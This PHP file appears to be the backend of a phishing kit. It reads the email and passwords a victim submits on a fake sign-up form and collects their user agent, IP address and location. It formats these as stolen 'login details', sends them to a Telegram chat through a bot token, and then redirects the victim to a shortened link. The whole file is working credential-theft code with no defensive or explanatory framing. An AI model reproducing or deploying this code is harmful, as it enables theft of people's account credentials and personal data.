<?php
require 'vendor/autoload.php';
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

session_start();

$useragent = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);

    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password1 = isset($_POST['password1']) ? trim($_POST['password1']) : '';
    $password2 = isset($_POST['password2']) ? trim($_POST['password2']) : '';

function get_client_ip() {
    $ip = file_get_contents('https://api64.ipify.org');
    return $ip;
}


$IP = get_client_ip();
$locationDetails = secure_curl('https://ipinfo.io/' . $IP . '?token=' . $_ENV['IPINFO_TOKEN']);
$locationData = json_decode($locationDetails, true);
$country = isset($locationData['country']) ? $locationData['country'] : 'Unknown';
$region = isset($locationData['region']) ? $locationData['region'] : 'Unknown';
$timezone = isset($locationData['timezone']) ? $locationData['timezone'] : 'Unknown';

function secure_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp = curl_exec($ch);


    if (curl_errno($ch)) {
        error_log('cURL error: ' . curl_error($ch));
        return false;
    }

    curl_close($ch);
    return $resp;
}

function getOS($useragent) {
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 11/i' => 'Windows 11',
        '/windows nt 10.0/i' => 'Windows 10',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/android/i' => 'Android'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array(
        '/edg/i' => 'Microsoft Edge',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/opera/i' => 'Opera'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser = $value;
        }
    }
    return $browser;
}

$os = getOS($useragent);
$browser = getBrowser($useragent);
$date = date("h:i:s d/m/Y");

$message = "[ ✳️ My personal account sign up ✳️ ]<br><br>";
$message .= "********** [ 💻 LOGIN DETAILS 💻 ] **********<br>";
$message .= "# EMAIL   : {$email}<br>";
$message .= "# PASSWORD 1   : {$password1}<br>";
$message .= "# PASSWORD 2  : {$password2}<br>";
$message .= "********** [ 🌍 BROWSER DETAILS 🌍 ] **********<br>";
$message .= "# USERAGENT  : {$useragent}<br>";
$message .= "# BROWSER    : {$browser}<br>";
$message .= "# OS         : {$os}<br>";
$message .= "********** [ 🧍‍♂️ USER'S DETAILS 🧍‍♂️ ] **********<br>";
$message .= "# IP ADDRESS : {$IP}<br>";
$message .= "# COUNTRY   : {$country}<br>";
$message .= "# REGION   : {$region}<br>";
$message .= "# TIMEZONE   : {$timezone}<br>";
$message .= "# DATE       : {$date}<br>";


$send = [
    'chat_id' => $_ENV['TELEGRAM_CHAT_ID'],
    'text' => strip_tags($message)
];
$website_telegram = "https://api.telegram.org/{$_ENV['TELEGRAM_BOT_TOKEN']}";
$ch = curl_init($website_telegram . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo '<script> window.location.href = "https://shorturl.at/RqNSS"; </script>';
?>
